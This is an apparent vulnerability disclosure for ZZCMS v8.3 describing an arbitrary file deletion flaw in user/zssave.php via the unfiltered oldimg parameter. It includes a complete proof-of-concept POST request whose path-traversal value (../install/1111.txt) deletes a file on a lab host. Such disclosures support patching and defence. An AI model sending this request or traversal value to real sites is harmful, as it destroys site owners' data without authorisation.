
# ZZCMS V8.3 Arbitrary file deletion vulnerability in user/zssave.php line 107 via the oldimg parameter
## Vulnerability CMS and version
zzcms v8.3   Download link:http://www.zzcms.net/download/zzcms8.3.zip
## Triggering conditions
Log in to access the user/zssave.php page
## Vulnerability details
in CMS /user/zssave.php line 107,The CMS determines whether the oldimg parameter value exists. If it exists, then delete it and update it. Because the framework does not perform security filtering on the oldimg parameter value, any file deletion vulnerability is caused.
![](https://github.com/seedis/zzcms/blob/master/image/delete1.png)

## POC
```
POST /user/zssave.php HTTP/1.1
Host: 192.168.30.216
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.30.216/user/zsmodify.php?id=1&page=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 395
Cookie: bdshare_firstime=1537240796511; PHPSESSID=gdfrssod38corqta0eho4shcs4; UserName=test; PassWord=a3f1308bd904cf33127380012be39839
Connection: close
Upgrade-Insecure-Requests: 1

proname=test&szm=&bigclassid=1&gnzz=test&sx%5B%5D=&sx%5B%5D=&sx%5B%5D=&sx%5B%5D=&sm=test&province=%E5%8C%97%E4%BA%AC&city=%E5%B8%82%E8%BE%96%E5%8E%BF&xiancheng=%E5%BB%B6%E5%BA%86%E5%8E%BF&cityforadd=%E5%BB%B6%E5%BA%86%E5%8E%BF&oldimg=../install/1111.txt&img=%2Fimage%2Fnopic.gif&oldflv=&flv=&zc=&yq=&cpid=1&action=modify&page=1&Submit=%E4%BF%9D%E5%AD%98%E4%BF%AE%E6%94%B9%E7%BB%93%E6%9E%9C%0D%0A

```
Here we create the 1111.txt file in the install directory for testing.Then delete the file by constructing a request,The oldimg parameter value is 1111.txt 
![](https://github.com/seedis/zzcms/blob/master/image/delete2.png)

After the request is successful, you can see that the file 1111.txt we constructed was successfully deleted.
![](https://github.com/seedis/zzcms/blob/master/image/delete3.png)
